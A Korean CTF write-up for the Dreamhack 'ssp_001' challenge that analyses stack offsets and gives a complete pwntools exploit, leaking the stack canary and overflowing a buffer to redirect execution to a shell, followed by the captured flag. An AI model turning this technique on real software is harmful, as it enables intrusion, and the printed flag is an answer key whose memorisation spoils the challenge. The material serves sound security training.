<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <h1> Dreamhack "ssp_001"  Write-UP</h1>
</body>
<br>
<br>
</html>

2025.09.22 풀이

<img width="760" height="328" alt="image" src="https://github.com/user-attachments/assets/4c3b9cfd-af27-4398-8895-e9f1bb525e95" />

checksec 명령어를 통해 확인해보니, 카나리를 가지고 있는 것을 확인할 수 있었다.

<br>

</br> 

<img width="1106" height="1300" alt="image" src="https://github.com/user-attachments/assets/b23f9b4f-c65c-4b77-8d29-c7c334ef919d" />

<img width="1070" height="1344" alt="image" src="https://github.com/user-attachments/assets/b396edcf-b7df-41d1-baf3-2dd7821cd665" />

<img width="1168" height="510" alt="image" src="https://github.com/user-attachments/assets/cb7ef3f1-508b-48d9-a6e8-4a5bc90350a4" />

디스어셈블 명령어로 살펴보면,

sub esp,0x94을 통해, 스택 전체 크기가 0x94인 점,

버퍼는 ebp - 0x88에서 시작되는 점,

카나리는 ebp - 0x08에 저장된다는 점

버퍼와 카나리 저장 주소의 거리를 0x80인 것을 알 수 있다.

따라서 리턴 주소를 덮으려면 0x88 바이트까지 채워야 하는 것을 알 수 있다.

이를 이용하여 문제 풀이를 진행해보려고 한다. 

<br>

</br> 

```
from pwn import *

context.log_level='debug'
context(arch='i386', os = 'linux')

p = remote('host3.dreamhack.games', 14073)

p.recvuntil('> ')
p.send('F')

p.recvuntil('box input : ')
p.send(b'A' * 0x40)

canary_leak = ''
for i in range(128, 132) :
    p.recvuntil('> ')
    p.send('P')
    p.recvuntil('Element index : ')
    p.sendline(str(i))
    p.recvuntil('is : ')
    canary_leak = canary_leak + chr(int(p.recvn(2), 16))
    
canary = u32(canary_leak)
print('canary : {}'.format(hex(canary)))

p.recvuntil('> ')
p.send('E')
p.recvuntil('Name Size : ')
p.sendline(str(100))
p.recvuntil('Name : ')

get_shell = 0x80486b9

payload = b'A' * 0x40
payload += p32(canary)
payload += b'A' * 8
payload += p32(get_shell)

p.send(payload)

p.interactive()
```
다음과 같이 익스플로잇 코드를 짰다. 

p 기능을 이용해 스택 카나리 값을 읽어 카나리를 복원한 뒤,

그 카나리를 페이로드에 넣어 스택이 깨지지 않게 유지한 채 Name 입력칸의 버퍼 오버플로우로

리턴 주소를 get_shell로 덮어 쉘을 얻게끔 코드를 작성하였다. 

<br>

</br> 

<img width="1280" height="509" alt="image" src="https://github.com/user-attachments/assets/be7042ab-3c89-4a40-a4b2-82d6ddb94136" />

<img width="1280" height="594" alt="image" src="https://github.com/user-attachments/assets/33a436f2-03e2-480f-b891-fc344fd3301c" />

해당 코드를 실행해보니, flag 값을 얻을 수 있었다. 


<br>

</br> 

```
DH{00c609773822372daf2b7ef9adbdb824}
```
